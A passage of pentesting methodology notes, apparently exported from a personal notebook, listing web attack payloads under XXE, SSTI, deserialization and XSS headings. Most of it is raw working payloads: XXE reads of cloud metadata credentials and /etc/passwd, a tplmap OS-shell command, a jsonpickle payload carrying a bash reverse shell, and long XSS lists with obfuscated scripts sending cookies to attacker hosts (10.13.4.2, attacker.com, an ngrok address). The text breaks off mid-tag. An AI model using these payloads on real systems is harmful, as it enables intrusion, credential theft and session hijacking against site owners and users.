level-7'>XXE SSRF</h1><br/><p>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</p><p>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;<a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</a>&quot;&gt; ]&gt;</p><p></p><p></p><p><img src="images/637-1.png" alt="images/637-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--Blind_XXE_Out_of_Band_639.html"></a><h1 class='title level-7'>Blind XXE Out of Band</h1><br/><p>&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;dizkpdxcrcxay9t68rmphyufi6owcl.oastify.com&quot;&gt; ]&gt;</p><p></p><p>&amp;xxe;</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--Blind_XXE_XML_Paramater_Entities_643.html"></a><h1 class='title level-7'>Blind XXE XML Paramater Entities</h1><br/><p>&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &quot;<a href="http://BURP-COLLABORATOR-SUBDOMAIN">http://BURP-COLLABORATOR-SUBDOMAIN</a>&quot;&gt; %xxe; ]&gt;</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--XInclude_642.html"></a><h1 class='title level-7'>XInclude</h1><br/><p>&lt;foo xmlns:xi=&quot;<a href="http://www.w3.org/2001/XInclude">http://www.w3.org/2001/XInclude</a>&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</p><p></p><p><img src="images/642-1.png" alt="images/642-1.png" /></p><p></p><p><img src="images/642-2.png" alt="images/642-2.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--XXE_with_repurposing_of_local_DTD_644.html"></a><h1 class='title level-7'>XXE with repurposing of local DTD</h1><br/><p>&lt;!DOCTYPE message [</p><p>&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</p><p>&lt;!ENTITY % ISOamso &#39;</p><p>&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</p><p>&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</p><p>&amp;#x25;eval;</p><p>&amp;#x25;error;</p><p>&#39;&gt;</p><p>%local_dtd;</p><p>]&gt;</p><p></p><p></p><p></p><p><img src="images/644-1.png" alt="images/644-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--XML_attacks--XXE--XXE_SVG_Image_Upload_645.html"></a><h1 class='title level-7'>XXE SVG Image Upload</h1><br/><p>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;<a href="http://www.w3.org/2000/svg">http://www.w3.org/2000/svg</a>&quot; xmlns:xlink=&quot;<a href="http://www.w3.org/1999/xlink">http://www.w3.org/1999/xlink</a>&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</p><p></p><p><img src="images/645-1.png" alt="images/645-1.png" /></p><p></p><p><span style="color:#3f4043;">Now open the SVG image in new tab, and inside it. Is our hostname output. Awesome</span></p><p></p><p><img src="images/645-2.png" alt="images/645-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Race_Conditions_487.html"></a><h1 class='title level-5'>Race Conditions</h1><br/><p>Race conditions:</p><p></p><p>Exceed number of coupons intended.</p><p>Exceed number of f.ex projects allowed on a free trial.</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SSTI_488.html"></a><h1 class='title level-5'>SSTI</h1><br/><p><span style="color:#3f4043;">Server Side Template Injection</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><a href="https://youtu.be/rJ-l_JSdUlE?list=PLkCYUwlLOT2oU3iwjCi2MiwaUvZrPFZl9&t=3860">https://youtu.be/rJ-l_JSdUlE?list=PLkCYUwlLOT2oU3iwjCi2MiwaUvZrPFZl9&amp;t=3860</a><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">SSTI:</span></p><p></p><p><span style="color:#3f4043;">Attempt SSTI in fields. (Use in intruder)</span></p><p><a href="http://somesite.com/user/settings?username=">http://somesite.com/user/settings?username=</a>{{7*7}}</p><p></p><p>@(4*5)</p><p>{{7*7}}</p><p>${7*7}</p><p>${{7*7}}</p><p>${{&lt;%[%&#39;&quot;}}%\</p><p>&lt;%= 7*7 %&gt;</p><p>&lt;%=7*7%&gt;</p><p>&lt;#assign x=7*7&gt;${x}</p><p>{% nosuchtag %}</p><p>{self}</p><p>{{self}}</p><p>${{7*7}}</p><p>#{7*7}</p><p>*{7*7}</p><p></p><p></p><p><span style="color:#3f4043;">Get shell if SSTI is present:</span></p><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><p>tplmap.py -u &#39;<a href="http://www.target.com/page?name=John*'">http://www.target.com/page?name=John*&#39;</a> --os-shell</p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Test in:</span></p><p>Query string paramater, ex: <a href="http://example.com/page?name=value">http://example.com/page?name=value</a></p><p>cookies</p><p>Path paramaters, ex:<a href="http://example.com/page/value">http://example.com/page/value</a> (Insert into the value area, it&#39;s a path paramater)</p><p>Form Fields</p><p></p><p></p><p></p><p><span style="color:#3f4043;">Test for blind:</span></p><p>res.end(require(&#39;child_process&#39;)execSync(&#39;wget 10.11.1.42/uwu.sh&#39;).toString())</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Deserialization_Attacks_491.html"></a><h1 class='title level-5'>Deserialization Attacks</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Deserialization_Attacks--Phar_Deserialization_492.html"></a><h1 class='title level-6'>Phar Deserialization</h1><br/><p><span style="color:#3f4043;">Phar Deserialization:</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">If there&#39;s an upload functionality f.ex upload your avatar image you could then upload a jpeg/phar file to get code execution if the code utilizes the right function. Ex the file_exists() function.</span></p><p></p><p><span style="color:#3f4043;">Make payload with</span></p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><p>./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Deserialization_Attacks--python_jsonpickle_493.html"></a><h1 class='title level-6'>python jsonpickle</h1><br/><p><span style="color:#3f4043;">“jsonpickle is a library for the two-way conversion of complex Python objects and JSON”</span></p><p><span style="color:#3f4043;">“jsonpickle is a Python library for serialization and deserialization of complex Python objects to and from JSON.”</span></p><p></p><p><span style="color:#3f4043;">example of unmodified string:</span></p><p>{&quot;py/object&quot;: &quot;app.User&quot;, &quot;username&quot;: &quot;Poseidon&quot;}</p><p>eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==</p><p></p><p><span style="color:#3f4043;">Example payload: (needs to be base64 encoded in the cookie header)</span></p><p>{&quot;py/object&quot;:&quot;__main__.Shell&quot;,&quot;py/reduce&quot;:[{&quot;py/function&quot;:&quot;os.system&quot;},[&quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.42/443 &lt;&amp;1&#39;&quot;], 0, 0, 0]}</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks_503.html"></a><h1 class='title level-5'>JavaScript Attacks</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks--XSS_441.html"></a><h1 class='title level-6'>XSS</h1><br/><p></p><p><a href="https://www.youtube.com/watch?v=GcznQUsNW3s&list=PLJ18l2m4Gsa_d-WrmQYi6AcjQCxRZ0wG1&index=49">https://www.youtube.com/watch?v=GcznQUsNW3s&amp;list=PLJ18l2m4Gsa_d-WrmQYi6AcjQCxRZ0wG1&amp;index=49</a> (automation)</p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a> (&lt;33)</p><p><a href="https://www.youtube.com/watch?v=MFrDux4kfsY">https://www.youtube.com/watch?v=MFrDux4kfsY</a></p><p><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></p><p><a href="http://www.jsfuck.com/#">http://www.jsfuck.com/#</a></p><p><a href="https://xss.js.org/#/xss05">https://xss.js.org/#/xss05</a></p><p></p><p></p><p><span style="color:#3f4043;">Try it on:</span><ul><li><span style="color:#3f4043;">URL query, fragment &amp; path;</span></li><li><span style="color:#3f4043;">all input fields.</span></p><p></li></ul><img src="images/441-1.png" alt="images/441-1.png" /></p><p></p><p>This one might need to try manually in burp:</p><p></p><p>&lt;script</p><p>&gt;alert(&#39;1&#39;);&lt;/script&gt;</p><p></p><p>&lt;img src=x onerror=&quot;eval(&#39;alert(1)&#39;)&quot;/&gt;</p><p></p><p><span style="color:#3f4043;">Payload list XSS:</span></p><p></p><p></p><p>&lt;svg/onload=confirm(1)&gt;</p><p>&amp;lt;sCrIpt&amp;gt;\u0061\u006c\u0065\u0072\u0074&amp;#40;1&amp;#41;&amp;lt;&amp;#47;sCrIpt&amp;gt;</p><p>&quot;&gt;&lt;svg onload=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</p><p>&lt;svg onload=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</p><p>&quot;&gt;&lt;svg onload=alert(1)&gt;</p><p>&lt;sVg/onfake=&quot;x=y&quot;oNload=;1^(co\u006efirm)``^1//</p><p>%00script%00alert(1)%00/script%00</p><p>&lt;script&gt;alert(1)&lt;/script&gt;</p><p>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</p><p>&lt;script&gt;\u0061\u006c\u0065rt(1)&lt;/script&gt;</p><p>&lt;img src=x onerror=&quot;\u0061lert(1)&quot;/&gt;</p><p>--&#39;`&quot;&gt;&lt;img src=x&gt;kdskf${{7*7}}</p><p>&lt;img src=x onerror=&quot;eval(&#39;\141lert(1)&#39;)&quot;/&gt;</p><p>&lt;img src=x onerror=&quot;\141\154\145\162\164(1)&quot;&gt;</p><p>&lt;img src=x onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)&quot;&gt;</p><p>💋img src=x onerror=\u0061\u006c\u0065rt(document.domain)//💛</p><p>💋img src=x onerror=alert(document.domain)//💛</p><p>💋img src=x onerror=alErT(document.domain)//💛</p><p>💋Img Src=x Onerror=alErT(document.domain)//💛</p><p>&lt;img src=x onerror=&quot;\u0065\u0076\u0061\u006c(&#39;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)&#39;)&quot;/&gt;</p><p>&lt;svg//////onload=\141\154\145\162\164(1)&gt;</p><p>&lt;script&gt;\46\43\170\66\61\73\46\43\170\66\143\73\46\43\170\66\65\73\46\43\170\67\62\73\46\43\170\67\64\73(1)&lt;/script&gt;</p><p>%u003cscript%u003ealert(1)%u003c/script%u003e</p><p>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</p><p>&quot;&gt;&lt;img src onerror=alert(1)&gt;</p><p>&lt;svg/onload=alert(1)&gt;</p><p>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;&gt;</p><p>&lt;img src=&quot;//10.13.4.2/xss.png&quot; onerror=alert(document.domain)&gt;</p><p>&lt;script&gt;document.location=&#39;//10.13.4.2/xss.php?cookie=&#39;+document.cookie;&lt;/script&gt;</p><p>&quot;autofocus onfocus=alert(1)//</p><p> javascript:alert(1)</p><p>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p><p>&#39;-alert(1)-&#39;</p><p>\&#39;-alert(1)//</p><p>javascript:alert(1)</p><p>&#39;;alert(&#39;xss&#39;);//</p><p>test&quot;&gt;&lt;img&gt;</p><p>--&gt;&quot;&gt;&lt;img src=x onerror=alert(location)//</p><p>--&gt;&quot;&gt;&lt;input&gt;</p><p>&amp;lt;script&amp;gt;document.location=&#39;<a href="http://10.13.4.2/xss.php?cookie='+document.cookie;&lt;/script&gt;">http://10.13.4.2/xss.php?cookie=&#39;+document.cookie;&amp;lt;/script&amp;gt;</a></p><p>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</p><p>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</p><p>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</p><p>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</p><p>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</p><p>&lt;svg/onload=eval(unescape(/var%20img%20%3D%20new%20Image%28%29%3B%20img.src%20%3D%20%22http%3A%2F%2F10.13.4.2%2Fsteal.php%3Fcookie%3D%22%20%2B%20document.cookie%3B/.source))&gt;</p><p>&lt;iframe src=<a href="http://10.13.4.2/report">http://10.13.4.2/report</a> height&quot;0&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;</p><p>&lt;script&gt;new Image().src=&quot;<a href="http://10.13.4.2/icon.jpg?output=">http://10.13.4.2/icon.jpg?output=</a>&quot;+document.cookie;&lt;/script&gt;</p><p>&lt;iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E</p><p>&lt;iframe src=68747470733a2f2f31302e31332e342e32302f7265706f72742068656164226231207769647468223e3c2f696e666f726d3e</p><p>&lt;iframe src=aHR0cDovLzEwLjEzLjQuMi9yZXBvcnQgaGVpZ2h0IjAiIHdpZHRoPSIwIj48L2lmcmFtZT4=</p><p>&lt;iframe src=104 116 104 058 47 47 49 48 46 49 51 46 52 46 50 48 47 114 101 112 111 114 116 32 104 101 97 100 116 39 32 119 105 100 116 104 34 62 60 47 105 110 102 114 109 62</p><p>eval(String.fromCharCode(60, 105, 102, 114, 97, 109, 101, 32, 115, 114, 99, 61, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 51, 46, 52, 46, 50, 47, 114, 101, 112, 111, 114, 116, 32, 104, 101, 105, 103, 104, 116, 61, 34, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 48, 34, 62, 60, 47, 105, 102, 114, 97, 109, 101, 62))</p><p>&lt;iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E</p><p>3c696e666f726d207372633d68747470733a2f2f31302e31332e342e32302f7265706f7274206865616468742231207769647468223d223022253e3c2f696e666f726d3e</p><p>&lt;iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E%00&lt;iframe src=<a href="http://10.13.4.2/report">http://10.13.4.2/report</a> height&quot;0&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;</p><p>&lt;iframe src=http%3A%2F%2F10.13.4.2%2Freport height%220%22 width%3D%220%22%3E%3C%2Fiframe%3E</p><p>&lt;script&gt;document.location=&#39;<a href="http://10.13.4.2/report';">http://10.13.4.2/report&#39;;</a>&lt;/script&gt;</p><p>%3cscript%3ealert(%22XSS%22)%3c%2fscript%3e</p><p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p><p>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</p><p>&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</p><p>&lt;svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&gt;</p><p>&lt;body onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&gt;</p><p>&lt;body onload=eval(atob(%27YWxlcnQoXCJYU1NcIik%27))&gt;</p><p>&lt;body onload=eval(decodeURIComponent(%27%61%6c%65%72%74%28%27%58%53%53%27%29%27))&gt;</p><p>&lt;body onload=eval(decodeURIComponent(%27%61%6c%65%72%74%28%22XSS%22%29%27))&gt;</p><p>&lt;ScRiPt&gt;alert(&#39;1&#39;);&lt;/sScRiPt&gt;</p><p>&lt;ScRiPt&gt;alert(&#39;1&#39;);</p><p>&lt;ScRiPt/random&gt;alert(&#39;1&#39;);&lt;/sScRiPt&gt;</p><p>&lt;Script/random&gt;alert(&#39;1&#39;);&lt;/script&gt;</p><p>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;1&#39;)&lt;/scr&lt;script&gt;ipt&gt;</p><p>&lt;scr\x00ipt&gt;ipt&gt;alert(&#39;1&#39;)&lt;/scr\x00ipt&gt;</p><p>&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;show&lt;/a&gt;</p><p>&lt;form id=x&gt;&lt;/form&gt;&lt;button form=&quot;x&quot; formaction=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;send&lt;/button&gt;</p><p>&lt;object data=&quot;//10.13.4.2/xss.swf&quot;&gt;</p><p>&lt;img src=x onerror=&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;&gt;</p><p>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</p><p>javascript:&quot;/*&#39;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \&quot; onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt; </p><p>&lt;svg/onload=document.location.href=&#39;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=&#39;&gt; </p><p>𓅂=&#39;&#39;,𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,𓊎=𓅂+{},𓆣=𓂀 [𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢 ],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+ 𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[ 𓇎]+𓂀[𓏢]+𓊝+𓆣+&#39;`𓅂 𓏢 𓂀 𓁄 𓆣 𓊝 𓇎`&#39;)``</p><p>[𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>Remember to use: <a href="http://www.jsfuck.com/#">http://www.jsfuck.com/#</a></p><p>and: <a href="https://hackvertor.co.uk/public#">https://hackvertor.co.uk/public#</a></p><p></p><p>&lt;script&gt;new Image().src = &quot;<a href="http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=">http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=</a>&quot; + document.cookie;&lt;/script&gt;</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks--XSS--In_JSON_609.html"></a><h1 class='title level-7'>In JSON</h1><br/><p>{</p><p>&quot;status&quot;: &quot;success&quot;,</p><p>&quot;message&quot;: &quot;&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&quot;</p><p>}</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>{</p><p> &quot;script&quot;: &quot;&amp;lt;script&amp;gt;document.location=&#39;<a href="http://10.13.4.2/xss.php?cookie='+document.cookie;&lt;/script&gt;">http://10.13.4.2/xss.php?cookie=&#39;+document.cookie;&amp;lt;/script&amp;gt;</a>&quot;</p><p>}</p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks--XSS--waf_evasion_techniques_608.html"></a><h1 class='title level-7'>waf evasion techniques</h1><br/><p><a href="https://www.youtube.com/watch?v=zhkCf8tldbk">https://www.youtube.com/watch?v=zhkCf8tldbk</a></p><p><a href="https://www.youtube.com/watch?v=J57NcPBXQDo&list=PLIbCFt2m6LvJdLzJEyK7osv6IezfQhYdw&index=1">https://www.youtube.com/watch?v=J57NcPBXQDo&amp;list=PLIbCFt2m6LvJdLzJEyK7osv6IezfQhYdw&amp;index=1</a></p><p><a href="https://hackvertor.co.uk/public#">https://hackvertor.co.uk/public#</a></p><p><a href="http://www.jsfuck.com/#">http://www.jsfuck.com/#</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks--XSS--more_payloads_718.html"></a><h1 class='title level-7'>more payloads</h1><br/><p>&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</p><p>&lt;img src=x onerror=alert(document.domain)&gt;</p><p>&lt;img/src=x onerror=alert(document.domain)&gt;</p><p>javascript:alert(document.domain)</p><p>javascript:prompt(document.domain)</p><p>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</p><p>&quot;);alert(document.domain);//</p><p>&lt;scr%00ipt&gt;alert(document.domain);&lt;/scr%00ipt&gt;</p><p>&lt;scRipt&gt;alert(document.domain);&lt;/scRipt&gt;</p><p>&lt;scr&lt;script&gt;ipt&gt;alert(document.domain);&lt;/scr&lt;script&gt;ipt&gt;</p><p>&lt;b%00r%00&gt;test&lt;/b%00r%00&gt;&lt;svg/onload=alert(document.domain)&gt;</p><p>&lt;/title&gt;&lt;svg/onload=alert(document.domain)&gt;</p><p>&quot;;alert(document.domain);//</p><p>&#39;)};alert(document.domain);//</p><p>&lt;/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</p><p>&quot;&gt;&lt;svg onload=alert(document.domain)&gt;</p><p>&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;Click me!&lt;/a&gt;</p><p>&lt;input type=&quot;text&quot; value=&quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;&gt;</p><p>&lt;iframe src=&quot;javascript:alert(document.domain)&quot;&gt;&lt;/iframe&gt;</p><p>&lt;img src=&quot;javascript:alert(document.domain)&quot;&gt;</p><p>&lt;svg/onload=confirm(1)&gt;</p><p>&lt;img src=x onerror=alert(1)&gt;</p><p>&lt;audio autoplay src=x onerror=alert(1)&gt;</p><p>&lt;video autoplay src=x onerror=alert(1)&gt;</p><p>&lt;body onload=alert(1)&gt;</p><p>&lt;marquee onstart=alert(1)&gt;</p><p>&lt;iframe src=javascript:alert(1)&gt;</p><p>&lt;script&gt;location=&#39;//attacker.com/&#39;+document.cookie;&lt;/script&gt;</p><p>&lt;a href=&quot;javascript:confirm(1)&quot;&gt;Click me!&lt;/a&gt;</p><p>&lt;form action=&quot;javascript:alert(1)&quot;&gt;</p><p>&lt;input type=&quot;image&quot; src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</p><p>&lt;details open ontoggle=alert(1)&gt;</p><p>&lt;textarea autofocus onfocus=alert(1)&gt;&lt;/textarea&gt;</p><p>&lt;img src=x:x onerror=alert(1)&gt;</p><p>&lt;svg onload=location.href=&#39;//attacker.com/&#39;+document.cookie&gt;</p><p>&lt;object data=x onerror=alert(1)&gt;</p><p>&lt;video src=x onerror=alert(1)&gt;</p><p>&lt;embed src=x onerror=alert(1)&gt;</p><p>&lt;isindex action=&quot;javascript:alert(1)&quot;&gt;yiipi&lt;/isindex&gt;</p><p>&lt;svg/onload=promptxss&gt;</p><p>&lt;body/onload=confirmxss&gt;</p><p>&lt;a href=&quot;javascript:document.body.innerHTML=&#39;XSS&#39;&quot;&gt;Click here&lt;/a&gt;</p><p>&lt;img/src/onerror=this.onerror=confirmxss&gt;</p><p>&lt;script&gt;&quot;\74img src=x onerror=alert`xss`&gt;&quot;&lt;/script&gt;</p><p>&lt;iframe/srcdoc=&quot;&lt;svg onload=alertxss&gt;&quot;&gt;</p><p>&lt;audio src onloadstart=alertxss&gt;&lt;/audio&gt;</p><p>&lt;video&gt;&lt;source onerror=alertxss&gt;&lt;/video&gt;</p><p>&lt;math href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click here&lt;/math&gt;</p><p>&lt;marquee/onstart=alertxss&gt;</p><p>&lt;b/onclick=confirmxss&gt;Click me&lt;/b&gt;</p><p>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt;</p><p>&lt;body onscroll=alert`xss`&gt;&lt;/body&gt;</p><p>&lt;img src=x:alertxss.png&gt;</p><p>&lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;confirm(&#39;XSS&#39;)&quot;&gt;Click me&lt;/a&gt;</p><p>&lt;iframe/onload=alertxss&gt;&lt;/iframe&gt;</p><p>&lt;embed/src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=&quot;&gt;</p><p>&lt;div style=&quot;pointer-events:none&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click here&lt;/a&gt;&lt;/div&gt;</p><p>&lt;plaintext&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;/plaintext&gt;</p><p>&lt;isindex action=&quot;javascript:prompt(&#39;XSS&#39;)&quot;&gt;Click me&lt;/isindex&gt;</p><p>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;</p><p>&amp;lt;iframe srcdoc=&amp;quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;</p><p>&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;Click me&amp;lt;/a&amp;gt;</p><p>&amp;lt;img src=&amp;quot;x&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;</p><p>&amp;lt;svg/onload=alert(1)&amp;gt;</p><p>&amp;lt;img src=x onerror=alert(1)&amp;gt;</p><p>&amp;lt;b%20onmouseover=alert(1)&amp;gt;Hover%20over%20me!&amp;lt;/b&amp;gt;</p><p>&amp;lt;div style=&amp;quot;background-image:url(javascript:alert(1))&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;</p><p>&amp;lt;div style=&amp;quot;width:expression(alert(1))&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;</p><p>&amp;lt;video poster=javascript:alert(1)&amp;gt;&amp;lt;/video&amp;gt;</p><p>&amp;lt;marquee/onstart=alert(1)&amp;gt;Move%20me!&amp;lt;/marquee&amp;gt;</p><p>&amp;lt;isindex formaction=javascript:alert(1)&amp;gt;</p><p>&amp;lt;meta 